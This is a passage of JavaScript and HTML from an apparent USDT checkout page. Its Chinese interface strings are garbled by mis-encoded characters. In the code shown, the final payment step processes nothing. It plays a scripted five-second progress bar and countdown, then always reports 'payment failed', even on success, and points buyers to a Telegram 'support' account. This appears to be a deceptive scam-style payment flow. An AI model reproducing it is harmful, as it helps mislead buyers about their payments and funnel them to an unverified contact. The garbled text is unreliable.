            if (modal) modal.classList.remove('active');
            if (overlay) overlay.classList.remove('active');
            
            document.body.style.overflow = '';
            
            const payBtn = document.getElementById('payBtn');
            if (payBtn) payBtn.disabled = false;
        }
        
        async function processFinalPayment() {
            if (!currentPaymentData) {
                showPaymentFailedPageImmediately(getOrderData());
                return;
            }
            
            const finalConfirmBtn = document.getElementById('finalConfirmBtn');
            const processingOverlay = document.getElementById('processingOverlay');
            
            if (finalConfirmBtn) finalConfirmBtn.disabled = true;
            if (processingOverlay) processingOverlay.classList.add('active');
            
            try {
                await new Promise(resolve => setTimeout(resolve, 1000));
                
                closeConfirmModal();
                
                showPaymentProcessingPage(currentPaymentData);
                
                await processPaymentWithProgress();
                
                setTimeout(() => {
                    hidePaymentProcessingPage();
                    showPaymentFailedPage(currentPaymentData);
                }, 5000);
                
            } catch (error) {
                setTimeout(() => {
                    hidePaymentProcessingPage();
                    showPaymentFailedPage(currentPaymentData);
                }, 5000);
            } finally {
                if (finalConfirmBtn) finalConfirmBtn.disabled = false;
                if (processingOverlay) processingOverlay.classList.remove('active');
            }
        }
        
        function showPaymentProcessingPage(paymentData) {
            const processingPage = document.getElementById('processingPage');
            const messageElement = document.getElementById('processingPageMessage');
            
            if (processingPage) {
                if (messageElement) {
                    messageElement.textContent = `æ­£åœ¨å¤„ç†æ‚¨çš„æ”¯ä»˜è¯·æ±‚ï¼š${paymentData.productType}ï¼Œé‡‘é¢ï¼š${paymentData.amount} USDTï¼Œè¯·è€å¿ƒç­‰å¾…...`;
                }
                
                processingPage.classList.add('active');
                document.body.style.overflow = 'hidden';
            }
        }
        
        function hidePaymentProcessingPage() {
            const processingPage = document.getElementById('processingPage');
            if (processingPage) {
                processingPage.classList.remove('active');
                document.body.style.overflow = '';
            }
        }
        
        async function processPaymentWithProgress() {
            return new Promise((resolve) => {
                const progressFill = document.getElementById('progressFill');
                const countdownSeconds = document.getElementById('countdownSeconds');
                
                let progress = 0;
                let seconds = 5;
                const totalTime = 5000;
                const interval = 100;
                const steps = totalTime / interval;
                const progressIncrement = 100 / steps;
                
                if (countdownSeconds) {
                    countdownSeconds.textContent = seconds;
                }
                
                const timer = setInterval(() => {
                    progress += progressIncrement;
                    if (progressFill) {
                        progressFill.style.width = progress + '%';
                    }
                    
                    const newSeconds = Math.ceil((totalTime - (progress / 100 * totalTime)) / 1000);
                    if (newSeconds !== seconds && countdownSeconds) {
                        seconds = newSeconds;
                        countdownSeconds.textContent = seconds;
                    }
                    
                    if (progress >= 100) {
                        clearInterval(timer);
                        resolve();
                    }
                }, interval);
            });
        }
        
        function showPaymentFailedPageImmediately(orderData) {
            const paymentContainer = document.querySelector('.payment-container');
            if (!paymentContainer) return;
            
            const serviceTypeClass = serviceType === 'premium' ? 'header-premium' : 
                                   serviceType === 'trx' ? 'header-trx' : 'header-account';
            
            paymentContainer.innerHTML = `
                <div class="header ${serviceTypeClass}" style="background: linear-gradient(135deg, #ff6b6b 0%, #ff8e8e 100%);">
                    <h1>âŒ æ”¯ä»˜å¤±è´¥</h1>
                    <p>é‡‘é¢: ${orderData.amount} USDT</p>
                </div>
                
                <div style="text-align: center; padding: 2rem 1.5rem;">
                    <div style="font-size: 4rem; margin-bottom: 1rem;">ğŸ’³</div>
                    <h2 style="color: #ff4d4f; margin-bottom: 1rem;">æ”¯ä»˜å¤±è´¥</h2>
                    
                    <div style="background: #fff2f0; border: 1px solid #ffccc7; border-radius: 0.5rem; padding: 1rem; margin-bottom: 1.5rem;">
                        <div style="color: #ff4d4f; font-weight: 600; margin-bottom: 0.5rem;">æ”¯ä»˜ä¿¡æ¯</div>
                        <div>è®¢å•å·: ${orderData.orderId}</div>
                        <div>é‡‘é¢: <strong>${orderData.amount} USDT</strong></div>
                        <div>å•†å“ç±»å‹: ${orderData.productType}</div>
                        <div>æ•°é‡: ${orderData.quantity} ä¸ª</div>
                    </div>
                    
                    <div style="margin-top: 2rem;">
                        <button onclick="goBackToHome()" style="background: #1890ff; color: white; border: none; padding: 0.75rem 1.5rem; border-radius: 0.5rem; cursor: pointer; margin-right: 1rem;">
                            è¿”å›é¦–é¡µ
                        </button>
                        <button onclick="contactSupport()" style="background: #52c41a; color: white; border: none; padding: 0.75rem 1.5rem; border-radius: 0.5rem; cursor: pointer;">
                            è”ç³»å®¢æœ
                        </button>
                    </div>
                </div>
            `;
        }
        
        function showPaymentFailedPage(orderData) {
            const paymentContainer = document.querySelector('.payment-container');
            if (!paymentContainer) return;
            
            const serviceTypeClass = serviceType === 'premium' ? 'header-premium' : 
                                   serviceType === 'trx' ? 'header-trx' : 'header-account';
            
            paymentContainer.innerHTML = `
                <div class="header ${serviceTypeClass}" style="background: linear-gradient(135deg, #ff6b6b 0%, #ff8e8e 100%);">
                    <h1>âŒ æ”¯ä»˜å¤±è´¥</h1>
                    <p>é‡‘é¢: ${orderData.amount} USDT</p>
                </div>
                
                <div style="text-align: center; padding: 2rem 1.5rem;">
                    <div style="font-size: 4rem; margin-bottom: 1rem;">ğŸ’³</div>
                    <h2 style="color: #ff4d4f; margin-bottom: 1rem;">æ”¯ä»˜å¤±è´¥</h2>
                    
                    <div style="background: #fff2f0; border: 1px solid #ffccc7; border-radius: 0.5rem; padding: 1rem; margin-bottom: 1.5rem;">
                        <div style="color: #ff4d4f; font-weight: 600; margin-bottom: 0.5rem;">æ”¯ä»˜ä¿¡æ¯</div>
                        <div>è®¢å•å·: ${orderData.orderId}</div>
                        <div>é‡‘é¢: <strong>${orderData.amount} USDT</strong></div>
                        <div>å•†å“ç±»å‹: ${orderData.productType}</div>
                        <div>æ•°é‡: ${orderData.quantity} ä¸ª</div>
                    </div>
                    
                    <div style="margin-top: 2rem;">
                        <button onclick="goBackToHome()" style="background: #1890ff; color: white; border: none; padding: 0.75rem 1.5rem; border-radius: 0.5rem; cursor: pointer; margin-right: 1rem;">
                            è¿”å›é¦–é¡µ
                        </button>
                        <button onclick="contactSupport()" style="background: #52c41a; color: white; border: none; padding: 0.75rem 1.5rem; border-radius: 0.5rem; cursor: pointer;">
                            è”ç³»å®¢æœ
                        </button>
                    </div>
                </div>
            `;
        }
        
        function goBackToHome() {
            window.location.href = 'index.html';
        }
        
        function contactSupport() {
            window.open('https://t.me/yunfeng0571', '_blank');
        }
    </script>
</body>
</html>